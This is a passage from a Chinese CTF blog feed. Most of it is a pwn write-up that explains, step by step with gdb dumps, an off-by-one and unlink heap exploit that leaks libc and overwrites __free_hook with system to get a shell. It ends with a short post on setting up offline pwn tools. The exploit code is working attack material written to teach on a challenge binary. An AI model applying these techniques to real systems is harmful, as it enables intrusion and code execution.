class="line">        io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    content = io.recvline()</span><br><span class="line">    io.info(content)</span><br><span class="line">    libc_base = u64(content.strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">'system: 0x%x'</span> % system_addr)</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    payload = p64(free_hook) + p64(<span class="number">0x200</span>)</span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    edit(<span class="number">6</span>, p64(system_addr))</span><br><span class="line">    io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">    remove(<span class="number">6</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<p>同样，我只讲解exp部分的内容，其余一样是准备工作</p>
<h5 id="填充并泄露堆块1地址"><a href="#填充并泄露堆块1地址" class="headerlink" title="填充并泄露堆块1地址"></a>填充并泄露堆块1地址</h5><p>一样的过程，利用off-by-one泄露地址，不讲了，只讲重点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">'11111'</span>, <span class="number">0x20</span>, <span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">printf()</span><br><span class="line">io.recvuntil(<span class="string">'Author: '</span>)</span><br><span class="line">io.recvuntil(<span class="string">"author"</span>)</span><br><span class="line">first_heap = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure>
<h5 id="创建堆块并remove掉"><a href="#创建堆块并remove掉" class="headerlink" title="创建堆块并remove掉"></a>创建堆块并remove掉</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x20</span>, <span class="string">"22222"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#3</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>这里是要将book6的结构体位置放到前面，方便利用，你可以自己去调试试试，不这样做的话，位置很难找，因为他定义的存储这个结构体的大小也是0x20+0x10(数据部分+结构部分)</p>
<h5 id="unlink部分-重点"><a href="#unlink部分-重点" class="headerlink" title="unlink部分(重点)"></a>unlink部分(重点)</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment">#4</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"44444"</span>, <span class="number">0x100</span><span class="number">-0x10</span>, <span class="string">'target'</span>) <span class="comment">#5</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read and write'</span>) <span class="comment">#6</span></span><br><span class="line">heap_base = first_heap - <span class="number">0x80</span></span><br><span class="line">ptr = heap_base + <span class="number">0x180</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) + <span class="string">'\x00'</span>*<span class="number">0xe0</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">remove(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<ol>
<li>创建两个smallchunk，因为unlink只有在smallbin下才可以，fastbin不行</li>
<li>最后一个chunk是用来编辑的，以及free的，free的参数要带/bin/sh，就是要将他改写成system函数</li>
<li>heap_base = first_heap - 0x80这个偏移自己定，每次调试可能都不一样，反正只要对的上你自己调试的时候就行，方便自己计算，我这里调试的时候是<br>[+] first_heap: 0x56182d174080所以减了0x80</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5653ee7a5080</span></span><br><span class="line"><span class="number">0x5653ee7a5080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005653ee7a5020</span></span><br><span class="line"><span class="number">0x5653ee7a5090</span>:	<span class="number">0x00005653ee7a5050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5653ee7a50a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a50b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005653ee7a50e0</span></span><br><span class="line"><span class="number">0x5653ee7a50c0</span>:	<span class="number">0x00005653ee7a53e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5653ee7a50d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a50e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a50f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5110</span>:	<span class="number">0x0000565300000005</span>	<span class="number">0x00005653ee7a5140</span></span><br><span class="line"><span class="number">0x5653ee7a5120</span>:	<span class="number">0x00005653ee7a52e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5653ee7a5130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5140</span>:	<span class="number">0x0000003434343434</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5170</span>:	<span class="number">0x0000565300000004</span>	<span class="number">0x00005653ee7a51a0</span></span><br><span class="line"><span class="number">0x5653ee7a5180</span>:	<span class="number">0x00005653ee7a51d0</span>	<span class="number">0x0000000000000108</span></span><br><span class="line"><span class="number">0x5653ee7a5190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a51a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005653ee7a5140</span></span><br><span class="line"><span class="number">0x5653ee7a51b0</span>:	<span class="number">0x00005653ee7a5170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5653ee7a51c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> #chunk4</span><br><span class="line"><span class="number">0x5653ee7a51d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000101</span> #实际可以写部分</span><br><span class="line"><span class="number">0x5653ee7a51e0</span>:	<span class="number">0x00005653ee7a5168</span>	<span class="number">0x00005653ee7a5170</span></span><br><span class="line"><span class="number">0x5653ee7a51f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>这是我显示first_heap后的数据，0x5653ee7a51d0便是申请的0x108的chunk，我在这里伪造了一个chunk，fd和bk在0x5653ee7a51e0，然后通过溢出将下个chunk的pre_size改成我这个伪造的chunk大小<br>在看看相邻的堆块</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5653ee7a51c0</span></span><br><span class="line"><span class="number">0x5653ee7a51c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5653ee7a51d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000101</span> #伪造的chunk记为p</span><br><span class="line"><span class="number">0x5653ee7a51e0</span>:	<span class="number">0x00005653ee7a5168</span>	<span class="number">0x00005653ee7a5170</span></span><br><span class="line"><span class="number">0x5653ee7a51f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5230</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5240</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52d0</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000100</span> #chunk5</span><br><span class="line"><span class="number">0x5653ee7a52e0</span>:	<span class="number">0x0000746567726174</span>	<span class="number">0x0000000000000000</span> #实际可以写部分</span><br><span class="line"><span class="number">0x5653ee7a52f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5300</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5330</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5340</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>这时候我remove(5)的话，会变成什么样呢？他会unlink(p)，然后将chunk5向前合并，不信试试看，这里数据需要精心构造，才能造成任意写的能力<br>remove(5)效果，变成了201，这是合并的效果，然后地址部分指向了libc部分的地址，如果我们能泄露这部分地址，就获得libc<br>还有个重点，我们的unlink过程没显示出来，我们分析下，unlink(p)做了啥<br>假设我们chunk4数据部分的地址为myptr<br>这里unlink(p)</p>
<ol>
<li>FD = ptr-0x18</li>
<li>BK = ptr-0x10</li>
<li>检测FD-&gt;bk==p? &amp;&amp; BK-&gt;fd == p?</li>
<li>检测成功过后</li>
<li>FD-&gt;bk &lt;=&gt; FD+0x18 &lt;=&gt; <em>(ptr-0x18+0x18) = BK = ptr-0x10 实际就是</em>ptr=ptr-0x10</li>
<li>BK-&gt;FD &lt;=&gt; BK+0x10 &lt;=&gt; <em>(ptr-0x10+0x10) = FD = ptr-0x18 实际就是</em>ptr=ptr-0x18<br>重点在第6行，我们将*ptr改成了ptr-0x18</li>
</ol>
<p>看ptr是哪里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">10</span>gx <span class="number">0x5577f976f080</span><span class="number">-0x80</span>+<span class="number">0x180</span></span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span></span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br></pre></td></tr></table></figure>
<p>从整体来看</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f080</span></span><br><span class="line"><span class="number">0x5577f976f080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005577f976f020</span></span><br><span class="line"><span class="number">0x5577f976f090</span>:	<span class="number">0x00005577f976f050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005577f976f0e0</span></span><br><span class="line"><span class="number">0x5577f976f0c0</span>:	<span class="number">0x00005577f976f3e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5577f976f0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f110</span>:	<span class="number">0x00005577f976f130</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f120</span>:	<span class="number">0x00005577f976f2e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5577f976f130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f170</span>:	<span class="number">0x0000557700000004</span>	<span class="number">0x00005577f976f1a0</span> #book4结构体</span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span> <span class="meta">#ptr，</span></span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>*ptr = ptr -0x18,也就是0x5577f976f180里的内容改为0x5577f976f168</p>
<p>这样，再次edit(4,payload)的话就可以修改从168开始的size以及name和description指针</p>
<p>合并效果</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f1c0</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f230</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f240</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2d0</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x5577f976f2e0</span>:	<span class="number">0x0000746567726174</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f300</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f330</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f340</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<h5 id="再次修改book4的结构体"><a href="#再次修改book4的结构体" class="headerlink" title="再次修改book4的结构体"></a>再次修改book4的结构体</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0x30</span>) + p64(<span class="number">4</span>) + p64(first_heap+<span class="number">0x40</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">edit(<span class="number">4</span>, p64(heap_base + <span class="number">0x1e0</span>))</span><br><span class="line">printf()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">content = io.recvline()</span><br><span class="line">io.info(content)</span><br><span class="line">libc_base = u64(content.strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3c4b7</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">'system: 0x%x'</span> % system_addr)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br></pre></td></tr></table></figure>
<p>0x30是他原来大小，4为id 4， 然后我将name和description指针都改为first_heap+0x40处，为什么是这里呢？因为，这里是book6的结构体部分的description部分指针，这样就获得了任意地址读写的能力，<br>第二次edit(4, p64(heap_base + 0x1e0))的时候就是将book6的description指针改成指向heap_base + 0x1e0处，为什么是这里，看上面<br>从整体来看</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f080</span></span><br><span class="line"><span class="number">0x5577f976f080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005577f976f020</span></span><br><span class="line"><span class="number">0x5577f976f090</span>:	<span class="number">0x00005577f976f050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005577f976f0e0</span></span><br><span class="line"><span class="number">0x5577f976f0c0</span>:	<span class="number">0x00005577f976f3e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5577f976f0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f110</span>:	<span class="number">0x00005577f976f130</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f120</span>:	<span class="number">0x00005577f976f2e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5577f976f130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f170</span>:	<span class="number">0x0000557700000004</span>	<span class="number">0x00005577f976f1a0</span> </span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span> </span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span> <span class="meta">#libc地址</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>这样就泄露了libc地址，那个固定偏移，也是利用vmmap查看，然后相减获得的</p>
<h5 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(free_hook) + p64(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">edit(<span class="number">6</span>, p64(system_addr))</span><br><span class="line">io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">remove(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br></pre></td></tr></table></figure>
<ol>
<li>edit(4,payload)这里将book6的description指针指向free_hook</li>
<li>然后edit是改成system地址，最后调用一次free就成了<h2 id="课后小知识总结"><a href="#课后小知识总结" class="headerlink" title="课后小知识总结"></a>课后小知识总结</h2></li>
<li>在gdb中用find查找字符串，可以获得指定位置</li>
<li>堆块会复用，就是free过后的小堆块，在再次malloc后会用相同的堆块</li>
<li>在计算的时候可以以一个为基地址，这样好计算</li>
<li>vmmap获得libc地址后，在相减获得固定偏移，适用于smallbin第一次free的chunk和mmap申请的堆块</li>
<li>具体情况具体分析，不要照搬照抄原版exp，有些是要改的，大佬们觉得简单可能就没注释了<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></li>
<li>题目不难，但自己做确实有点难度，研究了好久</li>
<li>写这个入门的文章也挺难的，要自己懂点，有人带就好点了，希望有师傅可以带带我</li>
<li>要开学了，另一道题目下次在研究了，off-by-one另一道题目</li>
<li>这道题同时学习了unlink跟off-by-one</li>
<li>我一定会出这个系列的文章的，坚持就是胜利(我对我自己说的，hh)</li>
</ol>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>论菜鸡pwn手如何在无网环境（ps：类似国赛)下生存</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="论菜鸡pwn手如何在无网环境（ps：类似国赛-下生存"><a href="#论菜鸡pwn手如何在无网环境（ps：类似国赛-下生存" class="headerlink" title="论菜鸡pwn手如何在无网环境（ps：类似国赛)下生存"></a>论菜鸡pwn手如何在无网环境（ps：类似国赛)下生存</h1><p>引言：在打完一次无网环境后，觉得没网环境实在难受，查个libc都没得查。。没准备好，那时碰巧我下了ctf-challenge,在那里碰巧弄到了libc，可能有人喜欢用libc-searcher那个py版本的项目，我不怎么喜欢，用那个导入库查找感觉较慢，还是喜欢手动泄露后到网页查找，于是有了这篇文章</p><a id="more"></a>
<h2 id="pwntools安装"><a href="#pwntools安装" class="headerlink" title="pwntools安装"></a>pwntools安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
<p>出错自己解决啊，那些个错误都查得到</p>
<h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure>
<h2 id="gdb配置"><a href="#gdb配置" class="headerlink" title="gdb配置"></a>gdb配置</h2><p>我个人觉得，peda和pwndbg必备，gef也可以用上，随你<br>自己写了个脚本，很渣，自选用不用<br><a href="https://github.com/qq1270287245/gdb-plugins" target="_blank" rel="noopener">项目地址</a><br>三个插件一起用会冲突，一部分功能失效，建议注释掉.gdbinit里的gef部分</p>
<h2 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h2><p>这个项目是国防科技大学弄的，挺好用的，最主要是能加载libc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/welpwn</span><br></pre></td></tr></table></figure>
<p>到项目目录下然后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>
<p>用法你可以看他项目里的介绍</p>
